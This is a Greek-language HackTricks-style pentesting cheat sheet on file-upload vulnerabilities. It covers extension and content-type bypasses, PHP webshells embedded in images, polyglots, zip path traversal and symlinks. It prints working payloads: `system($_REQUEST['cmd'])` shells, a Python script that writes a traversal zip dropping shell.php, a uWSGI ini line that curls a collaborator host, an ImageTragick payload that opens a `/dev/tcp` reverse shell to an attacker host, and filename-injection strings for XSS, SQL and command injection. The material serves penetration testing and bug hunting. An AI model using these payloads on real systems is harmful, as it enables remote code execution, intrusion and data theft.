# Μεταφόρτωση Αρχείων

{{#include ../../banners/hacktricks-training.md}}

## Γενική Μεθοδολογία Μεταφόρτωσης Αρχείων

Άλλες χρήσιμες επεκτάσεις:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Bypass file extensions checks

1. Εάν εφαρμόζεται, **ελέγξτε** τις **παραπάνω επεκτάσεις.** Δοκιμάστε τις επίσης χρησιμοποιώντας μερικά **κεφαλαία γράμματα**: _pHp, .pHP5, .PhAr ..._
2. _Ελέγξτε **προσθέτοντας μια έγκυρη επέκταση πριν** την εκτελέσιμη επέκταση (χρησιμοποιήστε και τις προηγούμενες επεκτάσεις):_
- _file.png.php_
- _file.png.Php5_
3. Δοκιμάστε να προσθέσετε **ειδικούς χαρακτήρες στο τέλος.** Μπορείτε να χρησιμοποιήσετε το Burp για **bruteforce** σε όλους τους χαρακτήρες **ascii** και **Unicode**. (_Σημείωση ότι μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε τις **προηγουμένως** αναφερθείσες **επεκτάσεις**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Προσπαθήστε να παρακάμψετε τους μηχανισμούς προστασίας **ξεγελώντας τον extension parser** στο server-side με τεχνικές όπως **doubling** της **επέκτασης** ή **προσθήκη junk** δεδομένων (**null** bytes) ανάμεσα στις επεκτάσεις. _Μπορείτε επίσης να χρησιμοποιήσετε τις **προηγούμενες επεκτάσεις** για να προετοιμάσετε ένα καλύτερο payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Προσθέστε **άλλο ένα επίπεδο επεκτάσεων** στον προηγούμενο έλεγχο:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Δοκιμάστε να βάλετε την **εκτελέσιμη επέκταση πριν** από την έγκυρη επέκταση και ελπίζετε ότι ο server είναι misconfigured. (χρήσιμο για εκμετάλλευση misconfigurations σε Apache όπου οτιδήποτε με επέκταση **.php**, αλλά **δεν χρειάζεται απαραίτητα να τελειώνει σε .php**, θα εκτελέσει κώδικα):
- _ex: file.php.png_
7. Χρήση των **NTFS alternate data stream (ADS)** στα **Windows**. Σε αυτή την περίπτωση, ο χαρακτήρας ":" θα εισαχθεί μετά από μια απαγορευμένη επέκταση και πριν από μια επιτρεπτή. Ως αποτέλεσμα, ένα **κενό αρχείο με την απαγορευμένη επέκταση** θα δημιουργηθεί στον server (π.χ. "file.asax:.jpg"). Αυτό το αρχείο μπορεί να επεξεργαστεί αργότερα χρησιμοποιώντας άλλες τεχνικές όπως η χρήση του short filename. Το pattern "**::$data**” μπορεί επίσης να χρησιμοποιηθεί για να δημιουργηθούν μη-κενά αρχεία. Επομένως, η προσθήκη ενός dot χαρακτήρα μετά από αυτό το pattern μπορεί επίσης να είναι χρήσιμη για περαιτέρω παράκαμψη περιορισμών (π.χ. "file.asp::$data.”)
8. Δοκιμάστε να σπάσετε τα όρια του ονόματος αρχείου. Η έγκυρη επέκταση κόβεται. Και το κακόβουλο PHP μένει. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

### Bypass Content-Type, Magic Number, Compression & Resizing

- Παράκαμψη ελέγχων **Content-Type** ρυθμίζοντας την **τιμή** του header **Content-Type** σε: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Παράκαμψη ελέγχου **magic number** προσθέτοντας στην αρχή του αρχείου τα **bytes ενός πραγματικού image** (να μπερδέψει την εντολή _file_). Ή εισάγετε το shell μέσα στα **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ή μπορείτε επίσης να **εισάγετε το payload απευθείας** σε μια εικόνα:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Αν γίνεται **συμπίεση** στην εικόνα σας, για παράδειγμα χρησιμοποιώντας κάποιες standard PHP βιβλιοθήκες όπως [PHP-GD](https://www.php.net/manual/fr/book.image.php), οι προηγούμενες τεχνικές δεν θα είναι χρήσιμες. Ωστόσο, μπορείτε να χρησιμοποιήσετε την PLTE chunk [**τεχνική ορισμένη εδώ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κάποιο κείμενο που θα **επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Η σελίδα θα μπορούσε επίσης να κάνει **resizing** της **image**, χρησιμοποιώντας για παράδειγμα τις PHP-GD συναρτήσεις `imagecopyresized` ή `imagecopyresampled`. Ωστόσο, μπορείτε να χρησιμοποιήσετε την IDAT chunk [**τεχνική ορισμένη εδώ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Άλλη τεχνική για να φτιάξετε ένα payload που **επιβιώνει ένα image resizing**, χρησιμοποιώντας τη PHP-GD function `thumbnailImage`. Ωστόσο, μπορείτε να χρησιμοποιήσετε την tEXt chunk [**τεχνική ορισμένη εδώ**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) για να εισάγετε κείμενο που θα **επιβιώσει της συμπίεσης**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Άλλα κόλπα για έλεγχο

- Βρείτε μια ευπάθεια για να **μετονομάσετε** το αρχείο που έχει ήδη ανέβει (για να αλλάξετε την επέκταση).
- Βρείτε μια **Local File Inclusion** ευπάθεια για να εκτελέσετε το backdoor.
- **Πιθανή αποκάλυψη πληροφοριών**:
1. Ανεβάστε **πολλές φορές** (και **ταυτόχρονα**) το **ίδιο αρχείο** με το **ίδιο όνομα**
2. Ανεβάστε ένα αρχείο με το **όνομα** ενός **αρχείου** ή **φακέλου** που **υπάρχει ήδη**
3. Ανεβάζοντας ένα αρχείο με **".", "..", ή "…"** ως όνομα. Για παράδειγμα, σε Apache σε **Windows**, αν η εφαρμογή αποθηκεύει τα ανεβασμένα αρχεία στο "/www/uploads/" directory, το όνομα αρχείου "." θα δημιουργήσει ένα αρχείο που ονομάζεται "uploads" μέσα στο "/www/" directory.
4. Ανεβάστε ένα αρχείο που μπορεί να μην διαγραφεί εύκολα όπως **"…:.jpg”** σε **NTFS**. (Windows)
5. Ανεβάστε ένα αρχείο σε **Windows** με **άκυρους χαρακτήρες** όπως `|<>*?”` στο όνομά του. (Windows)
6. Ανεβάστε ένα αρχείο σε **Windows** χρησιμοποιώντας **απαγορευμένα** ονόματα όπως CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Δοκιμάστε επίσης να **ανεβάσετε ένα executable** (.exe) ή ένα **.html** (λιγότερο ύποπτο) που **θα εκτελέσει κώδικα** όταν ανοιχτεί κατά λάθος από το θύμα.

### Ειδικά κόλπα με επεκτάσεις

Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **PHP server**, [ρίξτε μια ματιά στο κόλπο με το **.htaccess** για εκτέλεση κώδικα](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Αν προσπαθείτε να ανεβάσετε αρχεία σε έναν **ASP server**, [ρίξτε μια ματιά στο κόλπο με το **.config** για εκτέλεση κώδικα](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Τα `.phar` αρχεία είναι σαν τα `.jar` για την java, αλλά για php, και μπορούν να **χρησιμοποιηθούν σαν php αρχείο** (εκτελώντας τα με php, ή συμπεριλαμβάνοντάς τα μέσα σε ένα script...)

Η επέκταση `.inc` μερικές φορές χρησιμοποιείται για php αρχεία που χρησιμοποιούνται μόνο για **import files**, οπότε, κάποτε, κάποιος μπορεί να είχε επιτρέψει **αυτή την επέκταση να εκτελείται**.

## **Jetty RCE**

Αν μπορείτε να ανεβάσετε ένα XML αρχείο σε έναν Jetty server μπορείτε να αποκτήσετε [RCE because **new \*.xml and \*.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Έτσι, όπως αναφέρεται στην παρακάτω εικόνα, ανεβάστε το XML αρχείο στο `$JETTY_BASE/webapps/` και περιμένετε shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Για λεπτομερή διερεύνηση αυτής της ευπάθειας δείτε την αρχική έρευνα: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) ευπάθειες μπορούν να εκμεταλλευτούν σε uWSGI servers αν κάποιος έχει τη δυνατότητα να τροποποιήσει το `.ini` configuration file. Τα αρχεία ρύθμισης του uWSGI χρησιμοποιούν μια ειδική σύνταξη για να ενσωματώνουν "magic" μεταβλητές, placeholders και operators. Σημαντικά, ο operator '@', που χρησιμοποιείται ως `@(filename)`, έχει σχεδιαστεί για να συμπεριλαμβάνει τα περιεχόμενα ενός αρχείου. Μεταξύ των διαφόρων υποστηριζόμενων schemes στο uWSGI, το scheme "exec" είναι ιδιαίτερα ισχυρό, επιτρέποντας την ανάγνωση δεδομένων από το standard output μιας διεργασίας. Αυτή η δυνατότητα μπορεί να χειραγωγηθεί για κακόβουλους σκοπούς όπως Remote Command Execution ή Arbitrary File Write/Read όταν ένα `.ini` configuration file επεξεργάζεται.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Η εκτέλεση του payload συμβαίνει κατά την ανάλυση του αρχείου ρυθμίσεων. Για να ενεργοποιηθεί και να αναλυθεί η ρύθμιση, η διαδικασία uWSGI πρέπει είτε να επανεκκινηθεί (ενδεχομένως μετά από ένα crash ή εξαιτίας επίθεσης Denial of Service) είτε το αρχείο να έχει οριστεί σε auto-reload. Η λειτουργία auto-reload, εάν είναι ενεργοποιημένη, επαναφορτώνει το αρχείο σε καθορισμένα διαστήματα όταν εντοπιστούν αλλαγές.

Είναι κρίσιμο να κατανοήσει κανείς την χαλαρή φύση της ανάλυσης των αρχείων ρυθμίσεων από το uWSGI. Συγκεκριμένα, το payload που συζητήθηκε μπορεί να εισαχθεί σε ένα δυαδικό αρχείο (όπως μια εικόνα ή PDF), διευρύνοντας περαιτέρω το εύρος της πιθανής εκμετάλλευσης.

## **wget File Upload/SSRF Trick**

Σε κάποιες περιπτώσεις μπορεί να διαπιστώσετε ότι ένας server χρησιμοποιεί **`wget`** για **κατέβασμα αρχείων** και μπορείτε να **υποδείξετε** το **URL**. Σε αυτές τις περιπτώσεις, ο κώδικας μπορεί να ελέγχει ότι η επέκταση των κατεβασμένων αρχείων βρίσκεται μέσα σε μια whitelist για να διασφαλίσει ότι θα κατέβουν μόνο επιτρεπτά αρχεία. Ωστόσο, **αυτός ο έλεγχος μπορεί να παρακαμφθεί.**\ Το **μέγιστο** μήκος ενός **όνομα αρχείου** σε **linux** είναι **255**, όμως, το **wget** περικόπτει τα ονόματα αρχείων σε **236** χαρακτήρες. Μπορείτε να **κατεβάσετε ένα αρχείο με όνομα "A"\*232+".php"+".gif"**, αυτό το όνομα αρχείου θα **παρακάμψει** τον **έλεγχο** (όπως στο παράδειγμα **".gif"** είναι μια **έγκυρη** επέκταση) αλλά `wget` θα **μετονομάσει** το αρχείο σε **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) είναι ένα ισχυρό εργαλείο σχεδιασμένο για να βοηθάει Pentesters και Bug Hunters στο testing των file upload μηχανισμών. Αξιοποιεί διάφορες bug bounty τεχνικές για να απλοποιήσει τη διαδικασία εντοπισμού και εκμετάλλευσης ευπαθειών, εξασφαλίζοντας ολοκληρωμένες αξιολογήσεις των web applications.

### Corrupting upload indices with snprintf quirks (historical)

Ορισμένοι legacy upload handlers που χρησιμοποιούν `snprintf()` ή παρόμοια για να χτίσουν multi-file arrays από ένα single-file upload μπορούν να εξαπατηθούν ώστε να παραποιήσουν τη δομή `_FILES`. Εξαιτίας ασυνεπειών και αποκοπών στη συμπεριφορά του `snprintf()`, ένα προσεκτικά διαμορφωμένο single upload μπορεί να εμφανιστεί ως πολλαπλά indexed αρχεία στην πλευρά του server, μπερδεύοντας λογική που υποθέτει ένα αυστηρό σχήμα (π.χ. θεωρώντας το ως multi-file upload και ακολουθώντας μη ασφαλείς διαδρομές). Αν και σήμερα πιο niche, αυτό το μοτίβο “index corruption” εμφανίζεται περιστασιακά σε CTFs και παλαιότερους κώδικες.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Ανεβάστε ένα αρχείο που περιέχει soft links προς άλλα αρχεία. Στη συνέχεια, προσπελάζοντας τα αποσυμπιεσμένα αρχεία θα αποκτήσετε πρόσβαση στα αρχεία στα οποία δείχνουν οι σύνδεσμοι:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Αποσυμπίεση σε διαφορετικούς φακέλους

Η απροσδόκητη δημιουργία αρχείων σε φακέλους κατά την αποσυμπίεση αποτελεί σημαντικό πρόβλημα. Παρά τις αρχικές υποθέσεις ότι αυτή η ρύθμιση μπορεί να εμποδίσει την εκτέλεση εντολών σε επίπεδο OS μέσω κακόβουλων uploads αρχείων, η υποστήριξη ιεραρχικής συμπίεσης και οι δυνατότητες directory traversal της μορφής αρχείου ZIP μπορούν να εκμεταλλευτούν. Αυτό επιτρέπει σε επιτιθέμενους να παρακάμψουν περιορισμούς και να διαφύγουν από secure upload directories χειριζόμενοι τη λειτουργία αποσυμπίεσης της στοχευόμενης εφαρμογής.

Ένα αυτοματοποιημένο exploit για τη δημιουργία τέτοιων αρχείων είναι διαθέσιμο στο [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Το εργαλείο μπορεί να χρησιμοποιηθεί όπως φαίνεται:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Επιπλέον, η **symlink trick with evilarc** είναι μια επιλογή. Αν ο στόχος είναι να στοχεύσεις ένα αρχείο όπως το `/flag.txt`, θα πρέπει να δημιουργήσεις ένα symlink προς αυτό το αρχείο στο σύστημά σου. Αυτό εξασφαλίζει ότι το evilarc δεν θα αντιμετωπίσει σφάλματα κατά τη λειτουργία του.

Παρακάτω είναι ένα παράδειγμα κώδικα Python που χρησιμοποιείται για να δημιουργήσει ένα malicious zip file:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abusing compression for file spraying**

Για περισσότερες λεπτομέρειες **δείτε την πρωτότυπη ανάρτηση στο**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Γράφεται PHP κώδικας για την εκτέλεση εντολών που περνάνε μέσω της μεταβλητής `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Δημιουργούνται πολλαπλά αρχεία και συναρμολογείται ένα zip αρχείο που περιέχει αυτά τα αρχεία.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Τα ονόματα των αρχείων μέσα στο zip τροποποιούνται χρησιμοποιώντας vi ή έναν hex editor, αλλάζοντας το "xxA" σε "../" για να γίνει traversal φακέλων.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Ανεβάστε αυτό το περιεχόμενο με επέκταση εικόνας για να εκμεταλλευτείτε την ευπάθεια **(ImageMagick , 7.0.1-1)** (από το [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Ενσωμάτωση PHP Shell σε PNG

Η ενσωμάτωση ενός PHP shell στο IDAT chunk ενός PNG αρχείου μπορεί να παρακάμψει αποτελεσματικά ορισμένες λειτουργίες επεξεργασίας εικόνας. Οι συναρτήσεις `imagecopyresized` και `imagecopyresampled` από το PHP-GD είναι ιδιαίτερα σχετικές σε αυτό το πλαίσιο, καθώς χρησιμοποιούνται συνήθως για αλλαγή μεγέθους και resampling εικόνων, αντίστοιχα. Η ικανότητα του ενσωματωμένου PHP shell να παραμένει ανεπηρέαστο από αυτές τις λειτουργίες είναι ένα σημαντικό πλεονέκτημα για ορισμένες χρήσεις.

Μια λεπτομερής ανάλυση αυτής της τεχνικής, συμπεριλαμβανομένης της μεθοδολογίας και των πιθανών εφαρμογών, παρέχεται στο ακόλουθο άρθρο: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Αυτός ο πόρος προσφέρει μια ολοκληρωμένη κατανόηση της διαδικασίας και των επιπτώσεών της.

Περισσότερες πληροφορίες: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot αρχεία

Τα Polyglot αρχεία λειτουργούν ως ένα μοναδικό εργαλείο στην κυβερνοασφάλεια, ενεργώντας σαν χameleons που μπορούν νόμιμα να υπάρχουν σε πολλές μορφές αρχείων ταυτόχρονα. Ένα ενδιαφέρον παράδειγμα είναι το [GIFAR](https://en.wikipedia.org/wiki/Gifar), ένας υβριδικός τύπος που λειτουργεί τόσο ως GIF όσο και ως RAR archive. Τέτοια αρχεία δεν περιορίζονται σε αυτό το ζευγάρι· συνδυασμοί όπως GIF και JS ή PPT και JS είναι επίσης εφικτοί.

Η κύρια χρησιμότητα των polyglot αρχείων έγκειται στην ικανότητά τους να παρακάμπτουν μέτρα ασφαλείας που φιλτράρουν αρχεία βάσει τύπου. Συνηθισμένη πρακτική σε διάφορες εφαρμογές είναι να επιτρέπονται μόνο ορισμένοι τύποι αρχείων για upload—όπως JPEG, GIF, ή DOC—για να μετριαστεί ο κίνδυνος από πιθανώς επιβλαβείς μορφές (π.χ., JS, PHP, ή Phar αρχεία). Ωστόσο, ένα polyglot, συμμορφούμενο με τα δομικά κριτήρια πολλαπλών τύπων αρχείων, μπορεί να παρακάμψει αυτές τις περιοριστικές πολιτικές.

Παρότι είναι ευέλικτα, τα polyglots αντιμετωπίζουν περιορισμούς. Για παράδειγμα, ενώ ένα polyglot μπορεί ταυτόχρονα να ενσωματώνει ένα PHAR αρχείο (PHp ARchive) και ένα JPEG, η επιτυχία του upload μπορεί να εξαρτάται από την πολιτική της πλατφόρμας σχετικά με τις επεκτάσεις αρχείων. Αν το σύστημα είναι αυστηρό όσον αφορά τις επιτρεπτές επεκτάσεις, η απλή δομική διπλότητα ενός polyglot ενδέχεται να μην αρκεί για να εγγυηθεί το upload.

Περισσότερες πληροφορίες: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Φόρτωση έγκυρων JSON σαν να ήταν PDF

Πώς να αποφύγετε την ανίχνευση τύπου αρχείου ανεβάζοντας ένα έγκυρο JSON αρχείο ακόμη και αν δεν επιτρέπεται, προσποιούμενοι ότι είναι PDF (τεχνικές από **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Όσο τα magic bytes `%PDF` βρίσκονται στα πρώτα 1024 bytes είναι έγκυρο (δες παράδειγμα στο post)
- **`pdflib` library**: Προσθέστε μια ψεύτικη μορφή PDF μέσα σε ένα πεδίο του JSON ώστε η βιβλιοθήκη να νομίζει ότι πρόκειται για PDF (δες παράδειγμα στο post)
- **`file` binary**: Μπορεί να διαβάσει μέχρι 1048576 bytes από ένα αρχείο. Απλά δημιουργήστε ένα JSON μεγαλύτερο από αυτό ώστε να μην μπορεί να αναλύσει το περιεχόμενο ως JSON και μετά μέσα στο JSON βάλτε το αρχικό μέρος ενός πραγματικού PDF και θα θεωρήσει ότι είναι PDF

## Αναφορές

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
